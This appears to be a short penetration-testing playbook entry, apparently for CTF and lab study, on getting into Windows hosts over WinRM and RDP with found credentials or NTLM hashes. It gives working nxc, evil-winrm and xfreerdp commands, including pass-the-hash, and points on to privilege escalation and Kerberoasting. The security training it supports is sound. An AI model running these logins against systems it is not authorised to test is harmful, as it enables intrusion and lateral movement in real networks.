# WinRM And RDP Access

Use when Windows credentials or NTLM hashes are found and `5985/5986` or `3389` is open.

## Signals

- `5985` or `5986` open: WinRM.
- `3389` open: RDP.
- `nxc winrm` returns success or `Pwn3d`.
- Valid creds from SMB, Kerberoasting, AS-REP roasting, SQL, web config, or password reuse.

## Main Path

```bash
nxc winrm target -u user -p 'pass'
nxc winrm target -u user -H NTHASH
evil-winrm -i target -u user -p 'pass'
evil-winrm -i target -u user -H NTHASH
```

RDP:

```bash
nxc rdp target -u user -p 'pass'
xfreerdp /v:target /u:user /p:'pass' /cert:ignore +clipboard
```

## Options To Try

- If WinRM fails but creds are valid, test SMB shares, RDP, MSSQL, LDAP, and web admin panels.
- If RDP works but WinRM fails, use GUI access to inspect desktop files, saved credentials, and local admin state.
- If only a hash is available, use WinRM/SMB/WMI pass-the-hash instead of trying to crack first.
- If user is low privilege, run [Windows Privilege Escalation Blueprint](Windows%20Privilege%20Escalation%20Blueprint.md).
- If domain creds work, branch to [AD Kerberoasting Chain](AD%20Kerberoasting%20Chain.md).

## Study Examples

- Cajac VulnNet Roasted: discovered domain creds -> `nxc winrm` -> `evil-winrm`.
- Cajac Attacktive Directory: admin hash -> Evil-WinRM with `-H`.
